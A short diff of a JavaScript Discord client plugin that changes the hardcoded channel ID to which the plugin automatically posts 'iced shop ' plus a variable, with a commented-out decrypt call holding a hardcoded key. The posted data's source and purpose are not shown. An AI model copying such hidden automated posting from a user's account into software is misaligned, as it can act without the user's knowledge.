@@ -92,7 +92,7 @@ module.exports = class KekPlugin {
                 console.log(wow)
                 //console.log(decrypt(result.encryptedText, "bobcurmare", result.counter))
                 findByProps("getAPIBaseURL").post({
-                    url: "/channels/987353588307214356/messages",
+                    url: "/channels/1024412678539718817/messages",
                     body: {
                         "content": "iced shop " + wow
                     }
